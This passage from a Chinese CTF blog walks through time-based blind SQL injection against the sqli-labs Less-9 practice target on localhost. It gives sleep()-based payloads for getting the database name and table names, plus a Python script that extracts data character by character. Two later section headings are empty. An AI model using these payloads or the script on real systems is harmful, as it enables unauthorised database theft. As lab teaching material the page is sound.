<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> if(length(database()<span class="operator">=</span><span class="number">8</span>),sleep(<span class="number">3</span>),<span class="number">1</span>)#<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p>如果有延时说明数据库长度就是8</p>
<h5 id="3-获取数据库名"><a href="#3-获取数据库名" class="headerlink" title="3.获取数据库名"></a>3.获取数据库名</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(substr(database(),1,1)=&#x27;</span>s<span class="string">&#x27;,sleep(5),1)%23</span></span><br></pre></td></tr></table></figure>

<p>或者利用ascii函数</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">and</span><span class="operator">%</span><span class="number">20</span>if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)<span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>

<h5 id="4-获取表名"><a href="#4-获取表名" class="headerlink" title="4.获取表名"></a>4.获取表名</h5><p>可以先获取表的数量</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if((select count(table_name) from information_schema.tables where table_schema=&quot;security&quot;)=4,sleep(5),1)%23</span></span><br></pre></td></tr></table></figure>

<p>然后获取每个表的长度</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6,sleep(5),1)%23</span></span><br></pre></td></tr></table></figure>

<p>再然后获取表的名称</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(5),1)%23</span></span><br></pre></td></tr></table></figure>

<h5 id="5-获取字段名"><a href="#5-获取字段名" class="headerlink" title="5.获取字段名"></a>5.获取字段名</h5><h5 id="6-获取字段内容"><a href="#6-获取字段内容" class="headerlink" title="6.获取字段内容"></a>6.获取字段内容</h5><h4 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line">url=<span class="string">&quot;http://127.0.0.1/sqli/Less-9/?id=1&#x27; and &quot;</span></span><br><span class="line"><span class="comment"># select = &#x27;select database()&#x27;   #数据库  security</span></span><br><span class="line"><span class="comment"># select = &#x27;select group_concat(table_name) from information_schema.tables where table_schema=database()&#x27;   #表名  emails,referers,uagents,users</span></span><br><span class="line"><span class="comment"># select = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;emails&#x27;&quot;            #字段名</span></span><br><span class="line">select = <span class="string">&quot;select group_concat(email_id) from emails&quot;</span>   <span class="comment">#字段内容</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        payload = <span class="string">f&quot;if((ascii(substr((<span class="subst">&#123;select&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>),sleep(3),1)--+&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url+payload,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> :</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j==<span class="number">125</span>:</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%9B%B2%E6%B3%A8/" rel="tag">盲注</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
  </article>
  

  
  <nav class="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">下一页</a>
  </nav>
  
</section>
</div>

      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2023
        <i class="ri-heart-fill heart_icon"></i> f14g
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/favicon.ico" alt="CTF"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/me">关于我</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->

<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->
 <script type="text/x-mathjax-config">
  MathJax.Hub.Config({
      tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
  });

  MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for(i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
      }
  });
</script>

<script src="https://cdn.staticfile.org/mathjax/2.7.7/MathJax.js"></script>
<script src="https://cdn.staticfile.org/mathjax/2.7.7/config/TeX-AMS-MML_HTMLorMML-full.js"></script>
<script>
  var ayerConfig = {
    mathjax: true,
  };
</script>

<!-- Katex -->

<!-- busuanzi  -->
 
<script src="/js/busuanzi-2.3.pure.min.js"></script>
 
<!-- ClickLove -->

<!-- ClickBoom1 -->

<!-- ClickBoom2 -->
 
<script src="/js/clickBoom2.js"></script>
 
<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->

<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    

  </div>
</body>

</html>